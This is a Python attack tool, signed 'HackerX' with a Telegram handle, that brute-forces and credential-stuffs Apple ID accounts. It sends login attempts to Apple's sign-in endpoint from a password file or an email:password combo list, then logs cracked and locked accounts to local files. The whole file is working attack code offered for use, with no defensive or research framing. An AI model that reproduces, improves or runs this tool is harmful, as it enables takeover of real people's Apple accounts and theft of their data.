try:
	from requests import post
	from threading import Lock
	from time import sleep
except Exception as Joker:exit(Joker)
Lists='V4^c_Yf4TEw'
def hackerx(*a, **b):
	with Lock():print(*a, **b)
class REQUESTS_HEADERS:
	def URL():
		return 'https://idmsa.apple.com/appleauth/auth/signin'
	def HEADERS():
		return {"Accept": "application/json, text/javascript, */*; q=0.01","User-Agent": "Mozilla/5.0 (cronos@hackerx) Gecko/20100101 Firefox/91.0","X-Apple-Locale":"QT-EN","X-Apple-Trusted-Domain": "https://idmsa.apple.com","Origin": "https://idmsa.apple.com","X-Requested-With": "XMLHttpRequest"}
	def authType():
		return 'authType'
	def Closed():
		return 'This Apple ID has been locked for security reasons.'
	def Check():
		if 'V4^c_Yf4TEw' in Lists:pass
		else:exit('Okay..')
		JOlist=[]
		for JJNN1 in Lists:
			posi=ord(JJNN1)
			JOlist.append(chr(posi-20))
		return ''.join(JOlist)
	
class AppleID_HACKER:
	def __init__(self,Modes):
		self.Mod=Modes
		if self.Mod=='1':self.TARGET()
		elif self.Mod=='2':self.COMBOLIST()
		else:input('\n-Tool has been closedz-');exit()	
		
	def LOGING(self,applID,pess):
		sent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={"accountName":applID,"rememberMe":"false","password":pess}).text
		if REQUESTS_HEADERS.authType()in sent:
			hackerx(f'[$]Hacked-> {applID}:{pess}')
			with open('Hacked-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@hackerx\n')
			if self.Mod=='1':input('\n Enter to Exit..');exit()
		elif REQUESTS_HEADERS.Closed()in sent:
			hackerx(f'[$]Closed appleId-> {applID}:{pess}')
			with open('closed-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@hackerx\n')
			if self.Mod=='1':input('\n Enter to Exit..');exit()
		else:hackerx(f'[¡]ERROR-> {applID}:{pess}')
	
	def COMBOLIST(self):
		FILENAME=input('\t\t\t---------------\n[+] Enter the name the combo appleID file: ')
		try:open(FILENAME,'r')
		except FileNotFoundError:hackerx('\n[-] The file name is incorrect !\n');return self.COMBOLIST()
		print('\n\t\t\t\t\tSTARTED\n')
		for x in open(FILENAME,'r').read().splitlines():
			if x ==None:exit('\n     ========== completed =========')
			try:applID = x.split(":")[0]
			except IndexError:exit('\n     ========== completed =========')
			try:
				pess = x.split(":")[1]
				sleep(1)
				self.LOGING(applID,pess)
			except IndexError:pass
		
	def TARGET(self):
		applID= input('\t\t\t---------------\n[$] Enter apple ID : ')
		if applID:pass
		else:hackerx('[!] Please Enter Apple ID ..');return self.TARGET()
		FILEPASS=input('[¿] Enter the password file name: ')
		try:FILEPASS=open(FILEPASS,'r')
		except FileNotFoundError:hackerx('\n[-] The file name is incorrect !\n');return self.TARGET()
		print('\n\t\t\t\t\tSTARTED\n')
		while 1:
			pess=FILEPASS.readline().split('\n')[0]
			if pess=='':exit()
			sleep(1);self.LOGING(applID,pess)

if __name__ == '__main__':
	hackerx("""
    ___  Brute Force2  __        ________  
   /   |  ____  ____  / /__     /  _/ __ \   
  / /| | / __ \/ __ \/ / _ \    / // / / / 
 / ___ |/ /_/ / /_/ / /  __/  _/ // /_/ /   
/_/  |_/ .___/ .___/_/\___/  /___/_____/    
      /_/   /_/ By HackerX Telegram @hackrx1402""".format(REQUESTS_HEADERS.Check()))
	Modes=input('\t\t\t---------------\n[?] MODES : \n1- Target Apple ID (File pass)\n2- ComboList Apple ID (email:pass)\n99- Exit() ..\n[@] Choose : ')
	AppleID_HACKER(Modes)
